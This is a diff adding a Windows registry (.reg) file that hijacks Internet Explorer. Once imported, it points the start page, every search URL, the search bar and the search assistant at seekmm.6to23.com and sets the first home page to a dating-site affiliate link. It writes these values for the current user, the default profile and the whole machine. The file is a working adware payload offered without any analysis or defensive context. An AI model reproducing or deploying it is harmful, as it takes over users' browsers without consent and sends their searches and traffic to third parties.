@@ -1,0 +1,22 @@
+REGEDIT4
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"Start Page"="http://seekmm.6to23.com/"
+"First Home Page"="http://asiafriendfinder.com/go/p87991"
+"Default_Search_URL"="http://seekmm.6to23.com/"
+"Search Page"="http://seekmm.6to23.com/"
+"Search Bar"="http://seekmm.6to23.com/"
+"SearchURL"="http://seekmm.6to23.com/"
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer]
+"SearchURL"="http://seekmm.6to23.com/"
+[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer]
+"SearchURL"="http://seekmm.6to23.com/"
+[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main]
+"Search Page"="http://seekmm.6to23.com/"
+"Default_Search_URL"="http://seekmm.6to23.com/"
+"Search Bar"="http://seekmm.6to23.com/"
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://seekmm.6to23.com/"
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://seekmm.6to23.com/"
+[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://seekmm.6to23.com/"
